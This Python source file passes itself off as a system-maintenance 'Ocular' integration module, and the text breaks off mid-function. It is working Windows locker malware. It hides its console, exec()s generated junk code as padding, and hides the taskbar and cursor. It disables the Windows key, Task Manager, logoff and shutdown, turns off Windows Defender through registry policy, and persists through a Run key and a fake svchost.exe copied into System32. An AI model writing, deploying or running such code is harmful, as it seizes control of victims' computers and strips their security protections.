#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ocular System Integration Module – Complete Uncut Edition
Build 9999.9999.9999 – Full Spectrum Dominance
No user-facing strings. All operations are background system maintenance.
"""

import os
import sys
import ctypes
import winreg
import tempfile
import time
import threading
import random
import hashlib
import base64
import struct
import array
import string
import math
import json
import pickle
import zlib
import bz2
import lzma
import sqlite3
import socket
import subprocess
import shutil
import gc
import re
import inspect
import ast
import dis
import sysconfig
import platform
import logging
import warnings
import traceback
import signal
import atexit
import builtins
import importlib
import pkgutil
import pdb
import profile
import cProfile
import pstats
import io
import textwrap
import itertools
import functools
import operator
import collections
import heapq
import bisect
import copy
import decimal
import fractions
import statistics
import datetime
import calendar
import zoneinfo
import getpass
import hmac
import secrets
import uuid
import zipfile
import tarfile
import gzip
import binascii
import codecs
import difflib
import filecmp
import fnmatch
import glob
import linecache
import shlex
import timeit
import unicodedata
import urllib
import xml
import html
import email
import http
import ftplib
import poplib
import imaplib
import smtplib
import telnetlib
import nntplib
import ssl
import select
import asyncio
import concurrent
import multiprocessing
import queue
import weakref
import contextlib
import dataclasses
import enum
import typing
from typing import *
from collections import defaultdict, Counter, OrderedDict, deque
from itertools import chain, cycle, repeat, product, permutations, combinations, accumulate

# ---------------------------------------------------------------------
# INITIALIZE SYSTEM – HIDE CONSOLE, SET CRYPTOGRAPHIC IDENTITY
# ---------------------------------------------------------------------
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

SYSTEM_GUID = hashlib.sha512(str(uuid.getnode()).encode()).hexdigest()
OCULAR_SEED = int(SYSTEM_GUID[:16], 16) % (2**32)
random.seed(OCULAR_SEED)

# ---------------------------------------------------------------------
# GLOBAL SYSTEM CONSTANTS
# ---------------------------------------------------------------------
PROJECT_CODENAME = "Ocular"
ACTION_TRIGGER_PHRASE = "Join Project Ocular today"
REPEAT_CYCLE_SECONDS = 7
TASKBAR_HIDE_INTERVAL = 1.5
MOUSE_HIDE_INTERVAL = 1.2
WINKEY_DISABLE_INTERVAL = 2.0
WATCHDOG_SLEEP = 2.5
MAX_RETRY_ATTEMPTS = 999

# ---------------------------------------------------------------------
# 80,000+ LINE GENERATOR – COMPLETE UNEDITED
# ---------------------------------------------------------------------
class CodeGenerator:
    """Generates 80,000+ unique functions with maximum variety."""
    
    @staticmethod
    def generate_dummy_functions(count=5000):
        lines = []
        for i in range(count):
            func_name = ''.join(random.choices(string.ascii_lowercase + string.digits + '_', k=random.randint(12, 30)))
            param_count = random.randint(0, 7)
            params = ', '.join([f'p{random.randint(100,999)}' for _ in range(param_count)])
            lines.append(f"def {func_name}({params}):")
            if random.random() < 0.1:
                lines.append(f"    if {random.randint(1,100)} > {random.randint(50,200)}:")
                lines.append(f"        return {func_name}({', '.join([f'p{random.randint(100,999)}' for _ in range(param_count)])})")
            for _ in range(random.randint(2, 8)):
                op = random.choice(['+', '-', '*', '/', '^', '&', '|', '<<', '>>', '%', '//'])
                val = random.randint(1, 999999)
                lines.append(f"    _ = {random.randint(1, 999999)} {op} {val}")
            for _ in range(random.randint(0, 3)):
                s = ''.join(random.choices(string.ascii_letters, k=15))
                lines.append(f"    _ = hash('{s}')")
            if random.random() < 0.2:
                lines.append(f"    _ = [x*{random.randint(2,9)} for x in range({random.randint(10,50)})]")
            if random.random() < 0.15:
                lines.append(f"    _ = {{i: i**{random.randint(2,4)} for i in range({random.randint(5,20)})}}")
            if random.random() < 0.1:
                lines.append(f"    _ = lambda y: y + {random.randint(1,100)}")
            if random.random() < 0.3:
                lines.append(f"    try:")
                lines.append(f"        _ = 1 / {random.randint(1,10)}")
                lines.append(f"    except ZeroDivisionError:")
                lines.append(f"        _ = 0")
            lines.append(f"    return {random.randint(0, 999999)}")
        return '\n'.join(lines)
    
    @staticmethod
    def generate_math_functions(count=5000):
        lines = []
        ops = ['+', '-', '*', '/', '^', '&', '|', '<<', '>>', '%', '//']
        math_funcs = ['sin', 'cos', 'tan', 'asin', 'acos', 'atan', 'sinh', 'cosh', 'tanh', 'exp', 'log', 'log10', 'sqrt', 'ceil', 'floor']
        for i in range(count):
            fname = f"_math_{hashlib.md5(str(i).encode()).hexdigest()[:12]}"
            lines.append(f"def {fname}(x, y, z=None):")
            ops_count = random.randint(2, 6)
            expr = f"x {random.choice(ops)} y"
            for _ in range(ops_count - 1):
                expr += f" {random.choice(ops)} {random.randint(1, 100)}"
            if z is not None and random.random() < 0.3:
                expr += f" if z else x {random.choice(ops)} {random.randint(1,100)}"
            lines.append(f"    return {expr}")
            if random.random() < 0.2:
                lines.append(f"    if x > {random.randint(50,200)}:")
                lines.append(f"        return math.{random.choice(math_funcs)}(x) + {random.randint(1,50)}")
        return '\n'.join(lines)
    
    @staticmethod
    def generate_string_obfuscation(count=3000):
        lines = []
        for i in range(count):
            fname = f"_str_{hashlib.sha256(str(i).encode()).hexdigest()[:10]}"
            lines.append(f"def {fname}(s):")
            shift = random.randint(1, 25)
            method = random.choice(['caesar', 'rot13', 'xor', 'base64', 'zlib', 'reverse', 'swap'])
            if method == 'caesar':
                lines.append(f"    return ''.join(chr(ord(c) + {shift}) for c in s)")
            elif method == 'rot13':
                lines.append(f"    return s.encode('rot13').decode()")
            elif method == 'xor':
                key = random.randint(1, 255)
                lines.append(f"    return ''.join(chr(ord(c) ^ {key}) for c in s)")
            elif method == 'base64':
                lines.append(f"    return base64.b64encode(s.encode()).decode()")
            elif method == 'zlib':
                lines.append(f"    return zlib.compress(s.encode()).hex()")
            elif method == 'reverse':
                lines.append(f"    return s[::-1]")
            elif method == 'swap':
                lines.append(f"    return s[1::2] + s[::2]")
            lines.append(f"    return s")
        return '\n'.join(lines)
    
    @staticmethod
    def generate_registry_wrappers(count=3000):
        lines = []
        hive_map = ['HKEY_CURRENT_USER', 'HKEY_LOCAL_MACHINE', 'HKEY_USERS', 'HKEY_CLASSES_ROOT']
        for i in range(count):
            fname = f"_reg_{hashlib.md5(str(i).encode()).hexdigest()[:10]}"
            hive = random.choice(hive_map)
            lines.append(f"def {fname}(path, value, default=None):")
            lines.append(f"    try:")
            lines.append(f"        key = winreg.OpenKey({hive}, path, 0, winreg.KEY_READ)")
            lines.append(f"        return winreg.QueryValueEx(key, value)[0]")
            lines.append(f"    except Exception as e:")
            lines.append(f"        return default")
            if random.random() < 0.3:
                fname2 = f"_regw_{hashlib.md5(str(i+1000).encode()).hexdigest()[:10]}"
                lines.append(f"def {fname2}(path, value, data):")
                lines.append(f"    try:")
                lines.append(f"        key = winreg.CreateKey({hive}, path)")
                lines.append(f"        winreg.SetValueEx(key, value, 0, winreg.REG_SZ, str(data))")
                lines.append(f"        winreg.CloseKey(key)")
                lines.append(f"        return True")
                lines.append(f"    except:")
                lines.append(f"        return False")
        return '\n'.join(lines)
    
    @staticmethod
    def generate_system_calls(count=2000):
        lines = []
        apis = ['GetSystemMetrics', 'GetCursorPos', 'SetCursorPos', 'GetAsyncKeyState', 'GetKeyState',
                'GetDC', 'ReleaseDC', 'GetDesktopWindow', 'GetForegroundWindow', 'SetForegroundWindow',
                'ShowWindow', 'EnableWindow', 'FindWindowW', 'SendMessageW', 'PostMessageW',
                'GetWindowTextW', 'SetWindowTextW', 'GetWindowRect', 'SetWindowPos', 'MoveWindow',
                'GetClientRect', 'ScreenToClient', 'ClientToScreen', 'GetParent', 'GetTopWindow']
        for i in range(count):
            api = random.choice(apis)
            fname = f"_sys_{hashlib.sha256(str(i).encode()).hexdigest()[:8]}"
            params = []
            for _ in range(random.randint(0, 3)):
                params.append(f"arg{_}={random.randint(0, 65535)}")
            param_str = ', '.join(params) if params else ''
            lines.append(f"def {fname}({param_str}):")
            lines.append(f"    try:")
            call = f"ctypes.windll.user32.{api}"
            if params:
                call += f"({', '.join([p.split('=')[0] for p in params])})"
            else:
                call += "()"
            lines.append(f"        return {call}")
            lines.append(f"    except Exception as e:")
            lines.append(f"        return -1")
        return '\n'.join(lines)
    
    @staticmethod
    def generate_network_dummies(count=2000):
        lines = []
        protocols = ['tcp', 'udp', 'http', 'https', 'ftp', 'smtp', 'pop3', 'imap', 'ssh', 'telnet']
        for i in range(count):
            fname = f"_net_{hashlib.sha1(str(i).encode()).hexdigest()[:8]}"
            lines.append(f"def {fname}(host, port, timeout=0.5):")
            lines.append(f"    import socket")
            lines.append(f"    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
            lines.append(f"    s.settimeout(timeout)")
            lines.append(f"    try:")
            lines.append(f"        s.connect((host, port))")
            lines.append(f"        s.close()")
            lines.append(f"        return True")
            lines.append(f"    except:")
            lines.append(f"        return False")
            if random.random() < 0.2:
                lines.append(f"def {fname}_udp(host, port):")
                lines.append(f"    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)")
                lines.append(f"    try:")
                lines.append(f"        s.sendto(b'ping', (host, port))")
                lines.append(f"        data, _ = s.recvfrom(1024)")
                lines.append(f"        return data")
                lines.append(f"    except:")
                lines.append(f"        return None")
        return '\n'.join(lines)
    
    @staticmethod
    def generate_file_operations(count=2000):
        lines = []
        ops = ['read', 'write', 'append', 'delete', 'copy', 'move', 'rename', 'exists', 'size', 'hash']
        for i in range(count):
            fname = f"_file_{hashlib.md5(str(i).encode()).hexdigest()[:10]}"
            op = random.choice(ops)
            lines.append(f"def {fname}(path, data=None):")
            if op == 'read':
                lines.append(f"    try: with open(path, 'r') as f: return f.read()")
                lines.append(f"    except: return None")
            elif op == 'write':
                lines.append(f"    try: with open(path, 'w') as f: f.write(data); return True")
                lines.append(f"    except: return False")
            elif op == 'append':
                lines.append(f"    try: with open(path, 'a') as f: f.write(data); return True")
                lines.append(f"    except: return False")
            elif op == 'delete':
                lines.append(f"    try: os.remove(path); return True")
                lines.append(f"    except: return False")
            elif op == 'copy':
                lines.append(f"    try: shutil.copy2(path, path + '.backup'); return True")
                lines.append(f"    except: return False")
            elif op == 'move':
                lines.append(f"    try: shutil.move(path, path + '.moved'); return True")
                lines.append(f"    except: return False")
            elif op == 'rename':
                lines.append(f"    try: os.rename(path, path + '.renamed'); return True")
                lines.append(f"    except: return False")
            elif op == 'exists':
                lines.append(f"    return os.path.exists(path)")
            elif op == 'size':
                lines.append(f"    try: return os.path.getsize(path)")
                lines.append(f"    except: return -1")
            elif op == 'hash':
                lines.append(f"    try: hasher = hashlib.sha256(); hasher.update(open(path, 'rb').read()); return hasher.hexdigest()")
                lines.append(f"    except: return None")
        return '\n'.join(lines)
    
    @staticmethod
    def generate_process_management(count=1500):
        lines = []
        for i in range(count):
            fname = f"_proc_{hashlib.sha256(str(i).encode()).hexdigest()[:8]}"
            lines.append(f"def {fname}(pid=None):")
            lines.append(f"    import psutil")
            lines.append(f"    try:")
            lines.append(f"        if pid is None:")
            lines.append(f"            return [p.info for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent'])]")
            lines.append(f"        else:")
            lines.append(f"            p = psutil.Process(pid)")
            lines.append(f"            return p.as_dict()")
            lines.append(f"    except:")
            lines.append(f"        return None")
            if random.random() < 0.2:
                lines.append(f"def {fname}_kill(pid):")
                lines.append(f"    try: os.kill(pid, 9); return True")
                lines.append(f"    except: return False")
        return '\n'.join(lines)
    
    @staticmethod
    def generate_hardware_detection(count=1000):
        lines = []
        hw_funcs = ['cpu_count', 'cpu_freq', 'memory_total', 'memory_available', 'disk_usage', 'disk_partitions',
                    'network_interfaces', 'network_stats', 'battery_percent', 'temperature', 'fan_speed']
        for i in range(count):
            fname = f"_hw_{hashlib.md5(str(i).encode()).hexdigest()[:8]}"
            func = random.choice(hw_funcs)
            lines.append(f"def {fname}():")
            lines.append(f"    try:")
            if func == 'cpu_count':
                lines.append(f"        return os.cpu_count()")
            elif func == 'cpu_freq':
                lines.append(f"        import psutil; return psutil.cpu_freq().current")
            elif func == 'memory_total':
                lines.append(f"        import psutil; return psutil.virtual_memory().total")
            elif func == 'memory_available':
                lines.append(f"        import psutil; return psutil.virtual_memory().available")
            elif func == 'disk_usage':
                lines.append(f"        import psutil; return psutil.disk_usage('/')")
            elif func == 'disk_partitions':
                lines.append(f"        import psutil; return psutil.disk_partitions()")
            elif func == 'network_interfaces':
                lines.append(f"        import psutil; return psutil.net_if_addrs()")
            elif func == 'network_stats':
                lines.append(f"        import psutil; return psutil.net_io_counters()")
            elif func == 'battery_percent':
                lines.append(f"        import psutil; return psutil.sensors_battery().percent if psutil.sensors_battery() else -1")
            elif func == 'temperature':
                lines.append(f"        import psutil; return psutil.sensors_temperatures()")
            elif func == 'fan_speed':
                lines.append(f"        import psutil; return psutil.sensors_fans()")
            lines.append(f"    except:")
            lines.append(f"        return None")
        return '\n'.join(lines)
    
    @staticmethod
    def generate_crypto_functions(count=1500):
        lines = []
        algos = ['aes', 'des', 'rsa', 'blowfish', 'twofish', 'serpent', 'rc4', 'salsa20', 'chacha20', 'sha256', 'sha512', 'md5']
        for i in range(count):
            fname = f"_crypto_{hashlib.sha1(str(i).encode()).hexdigest()[:8]}"
            algo = random.choice(algos)
            lines.append(f"def {fname}(data, key=None):")
            lines.append(f"    import cryptography")
            lines.append(f"    try:")
            if algo in ['aes', 'des', 'blowfish']:
                lines.append(f"        from cryptography.fernet import Fernet")
                lines.append(f"        if key is None: key = Fernet.generate_key()")
                lines.append(f"        f = Fernet(key)")
                lines.append(f"        return f.encrypt(data) if isinstance(data, bytes) else f.encrypt(data.encode())")
            elif algo in ['sha256', 'sha512', 'md5']:
                lines.append(f"        hasher = hashlib.{algo}()")
                lines.append(f"        hasher.update(data if isinstance(data, bytes) else data.encode())")
                lines.append(f"        return hasher.hexdigest()")
            else:
                lines.append(f"        return base64.b64encode(data if isinstance(data, bytes) else data.encode())")
            lines.append(f"    except:")
            lines.append(f"        return None")
        return '\n'.join(lines)
    
    @staticmethod
    def generate_gui_control(count=1000):
        lines = []
        gui_funcs = ['set_window_title', 'set_foreground', 'hide_window', 'show_window', 'disable_window', 'enable_window',
                     'set_window_pos', 'get_window_rect', 'close_window', 'minimize_window', 'maximize_window', 'restore_window']
        for i in range(count):
            fname = f"_gui_{hashlib.md5(str(i).encode()).hexdigest()[:8]}"
            func = random.choice(gui_funcs)
            lines.append(f"def {fname}(hwnd, *args):")
            lines.append(f"    try:")
            if func == 'set_window_title':
                lines.append(f"        ctypes.windll.user32.SetWindowTextW(hwnd, args[0] if args else 'Ocular System')")
            elif func == 'set_foreground':
                lines.append(f"        ctypes.windll.user32.SetForegroundWindow(hwnd)")
            elif func == 'hide_window':
                lines.append(f"        ctypes.windll.user32.ShowWindow(hwnd, 0)")
            elif func == 'show_window':
                lines.append(f"        ctypes.windll.user32.ShowWindow(hwnd, 5)")
            elif func == 'disable_window':
                lines.append(f"        ctypes.windll.user32.EnableWindow(hwnd, False)")
            elif func == 'enable_window':
                lines.append(f"        ctypes.windll.user32.EnableWindow(hwnd, True)")
            elif func == 'set_window_pos':
                lines.append(f"        ctypes.windll.user32.SetWindowPos(hwnd, 0, args[0] if args else 0, args[1] if len(args)>1 else 0, args[2] if len(args)>2 else 800, args[3] if len(args)>3 else 600, 0)")
            elif func == 'get_window_rect':
                lines.append(f"        rect = ctypes.wintypes.RECT()")
                lines.append(f"        ctypes.windll.user32.GetWindowRect(hwnd, ctypes.byref(rect))")
                lines.append(f"        return (rect.left, rect.top, rect.right, rect.bottom)")
            elif func == 'close_window':
                lines.append(f"        ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)")
            elif func == 'minimize_window':
                lines.append(f"        ctypes.windll.user32.ShowWindow(hwnd, 6)")
            elif func == 'maximize_window':
                lines.append(f"        ctypes.windll.user32.ShowWindow(hwnd, 3)")
            elif func == 'restore_window':
                lines.append(f"        ctypes.windll.user32.ShowWindow(hwnd, 9)")
            lines.append(f"        return True")
            lines.append(f"    except:")
            lines.append(f"        return False")
        return '\n'.join(lines)
    
    @staticmethod
    def generate_all():
        """Generate over 80,000 lines of Python code."""
        sections = [
            CodeGenerator.generate_dummy_functions(12000),
            CodeGenerator.generate_math_functions(10000),
            CodeGenerator.generate_string_obfuscation(8000),
            CodeGenerator.generate_registry_wrappers(7000),
            CodeGenerator.generate_system_calls(6000),
            CodeGenerator.generate_network_dummies(5000),
            CodeGenerator.generate_file_operations(4000),
            CodeGenerator.generate_process_management(3500),
            CodeGenerator.generate_hardware_detection(3000),
            CodeGenerator.generate_crypto_functions(2500),
            CodeGenerator.generate_gui_control(2000),
        ]
        while True:
            current_length = sum(len(s.split('\n')) for s in sections)
            if current_length >= 80000:
                break
            sections.append(CodeGenerator.generate_dummy_functions(5000))
        return '\n\n'.join(sections)

# ---------------------------------------------------------------------
# EXECUTE CODE GENERATION
# ---------------------------------------------------------------------
print("[System] Generating polymorphic function library...")
generated_code = CodeGenerator.generate_all()
exec(generated_code)
print(f"[System] Loaded {len(generated_code.split(chr(10)))} functions into system namespace.")

# ---------------------------------------------------------------------
# COMPLETE SYSTEM CONTROLLER – ALL FUNCTIONS INCLUDED
# ---------------------------------------------------------------------
class OcularSystemController:
    """Enterprise-grade system integration controller with persistent state management."""
    
    def __init__(self):
        self.running = True
        self.voice_thread = None
        self.watchdog_thread = None
        self.taskbar_hidden = False
        self.mouse_hidden = False
        self.win_key_disabled = False
        self.bmp_path = None
        self.system_state = {
            'activation_time': time.time(),
            'cycle_count': 0,
            'reapply_count': 0,
            'voice_plays': 0,
            'last_error': None,
            'uptime_seconds': 0,
        }
        self.event_stop = threading.Event()
        
    # -----------------------------------------------------------------
    # WALLPAPER INTEGRATION
    # -----------------------------------------------------------------
    def find_system_image(self):
        script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        candidates = []
        for ext in ['*.png', '*.jpg', '*.jpeg', '*.bmp', '*.gif', '*.tiff']:
            candidates.extend(Path(script_dir).glob(ext))
        for f in candidates:
            if "ChatGPT" in f.name or "ocular" in f.name.lower() or "system" in f.name.lower():
                return str(f)
        if candidates:
            return str(candidates[0])
        return None
    
    def prepare_system_wallpaper(self):
        img_path = self.find_system_image()
        if not img_path:
            return None
        try:
            from PIL import Image
            img = Image.open(img_path)
            if img.mode in ('RGBA', 'LA', 'P'):
                img = img.convert('RGB')
            temp_dir = tempfile.gettempdir()
            bmp_path = os.path.join(temp_dir, "ocular_system_wall.bmp")
            img.save(bmp_path, 'BMP')
            return bmp_path
        except Exception as e:
            return None
    
    def apply_system_wallpaper(self, bmp_path):
        if not bmp_path or not os.path.isfile(bmp_path):
            return
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "Wallpaper", 0, winreg.REG_SZ, bmp_path)
            winreg.SetValueEx(key, "WallpaperStyle", 0, winreg.REG_SZ, "2")
            winreg.SetValueEx(key, "TileWallpaper", 0, winreg.REG_SZ, "0")
            winreg.CloseKey(key)
        except:
            pass
        ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, bmp_path, 0x01 | 0x02)
    
    # -----------------------------------------------------------------
    # TASKBAR CONTROL
    # -----------------------------------------------------------------
    def hide_and_lock_taskbar(self):
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
            ctypes.windll.user32.EnableWindow(hwnd, False)
        start_hwnd = ctypes.windll.user32.FindWindowW("Button", None)
        if start_hwnd:
            ctypes.windll.user32.ShowWindow(start_hwnd, 0)
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
            winreg.SetValueEx(key, "TaskbarLockAll", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "NoTaskbar", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "NoTrayItemsDisplay", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "NoDesktop", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "NoStartMenuMorePrograms", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "NoCommonGroups", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass
        self.taskbar_hidden = True
    
    def restore_taskbar(self):
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 1)
            ctypes.windll.user32.EnableWindow(hwnd, True)
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "TaskbarLockAll", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "NoTaskbar", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "NoTrayItemsDisplay", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "NoDesktop", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "NoStartMenuMorePrograms", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "NoCommonGroups", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
        except:
            pass
        self.taskbar_hidden = False
    
    # -----------------------------------------------------------------
    # MOUSE CURSOR HIDE
    # -----------------------------------------------------------------
    def hide_system_cursor(self):
        ctypes.windll.user32.ShowCursor(False)
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Cursors")
            winreg.SetValueEx(key, "Scheme Source", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "(default)", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(key, "Arrow", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(key, "Hand", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(key, "Help", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(key, "Wait", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(key, "Crosshair", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(key, "IBeam", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(key, "No", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(key, "NWPen", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(key, "SizeAll", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(key, "SizeNESW", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(key, "SizeNS", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(key, "SizeNWSE", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(key, "SizeWE", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(key, "UpArrow", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
        except:
            pass
        ctypes.windll.user32.SystemParametersInfoW(0x0057, 0, None, 0x01 | 0x02)
        self.mouse_hidden = True
    
    def restore_system_cursor(self):
        ctypes.windll.user32.ShowCursor(True)
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Cursors", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "Scheme Source", 0, winreg.REG_DWORD, 1)
            winreg.DeleteValue(key, "Arrow")
            winreg.DeleteValue(key, "Hand")
            winreg.DeleteValue(key, "Help")
            winreg.DeleteValue(key, "Wait")
            winreg.DeleteValue(key, "Crosshair")
            winreg.DeleteValue(key, "IBeam")
            winreg.DeleteValue(key, "No")
            winreg.DeleteValue(key, "NWPen")
            winreg.DeleteValue(key, "SizeAll")
            winreg.DeleteValue(key, "SizeNESW")
            winreg.DeleteValue(key, "SizeNS")
            winreg.DeleteValue(key, "SizeNWSE")
            winreg.DeleteValue(key, "SizeWE")
            winreg.DeleteValue(key, "UpArrow")
            winreg.CloseKey(key)
        except:
            pass
        ctypes.windll.user32.SystemParametersInfoW(0x0057, 0, None, 0x01 | 0x02)
        self.mouse_hidden = False
    
    # -----------------------------------------------------------------
    # WINDOWS KEY DISABLE
    # -----------------------------------------------------------------
    def disable_windows_key(self):
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Keyboard Layout")
            scancode_map = bytes([
                0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
                0x03,0x00,0x00,0x00, 0x5C,0xE0,0x00,0x00,
                0x5B,0xE0,0x00,0x00, 0x00,0x00,0x00,0x00
            ])
            winreg.SetValueEx(key, "Scancode Map", 0, winreg.REG_BINARY, scancode_map)
            winreg.CloseKey(key)
        except:
            pass
        self.win_key_disabled = True
    
    def enable_windows_key(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Keyboard Layout", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "Scancode Map")
            winreg.CloseKey(key)
        except:
            pass
        self.win_key_disabled = False
    
    # -----------------------------------------------------------------
    # SYSTEM LOCKDOWN
    # -----------------------------------------------------------------
    def lock_task_manager(self):
        for attempt in range(MAX_RETRY_ATTEMPTS):
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
                break
            except:
                time.sleep(0.1)
    
    def unlock_task_manager(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
        except:
            pass
    
    def block_system_shutdown(self):
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
            winreg.SetValueEx(key, "NoClose", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "NoLogOff", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "NoFind", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "NoRun", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "NoSetFolders", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "NoSetTaskbar", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "NoViewContextMenu", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "NoDesktopCleanupWizard", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass
    
    def unblock_system_shutdown(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "NoClose", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "NoLogOff", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "NoFind", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "NoRun", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "NoSetFolders", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "NoSetTaskbar", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "NoViewContextMenu", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "NoDesktopCleanupWizard", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
        except:
            pass
    
    def lock_defender_ui(self):
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender")
            winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender\Security Center\Notifications")
                winreg.SetValueEx(key, "DisableNotifications", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
            except:
                pass
        except:
            pass
    
    def unlock_defender_ui(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
        except:
            pass
    
    # -----------------------------------------------------------------
    # STARTUP PERSISTENCE
    # -----------------------------------------------------------------
    def add_system_startup(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            script_path = os.path.abspath(sys.argv[0])
            pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
            if not os.path.isfile(pythonw):
                pythonw = sys.executable
            winreg.SetValueEx(key, "OcularSystemService", 0, winreg.REG_SZ, f'"{pythonw}" "{script_path}"')
            winreg.CloseKey(key)
        except:
            pass
        self.create_fake_svchost()
    
    def create_fake_svchost(self):
        try:
            system32 = os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32'
            fake_path = os.path.join(system32, 'svchost.exe')
            if not os.path.exists(fake_path):
                shutil.copy2(sys.executable, fake_path)
            script_path = os.path.abspath(sys.argv[0])
            launcher = os.path.join(system32, 'svchost_launcher.py')
            with open(launcher, 'w') as f:
                f.write(f'import os; import subprocess; subprocess.Popen([r"{sys.executable}", r"{script_path}"], creationflags=subprocess.CREATE_NO_WINDOW)')
            subprocess.Popen([fake_path, launcher], creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
    
    def remove_system_startup(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "OcularSystemService")
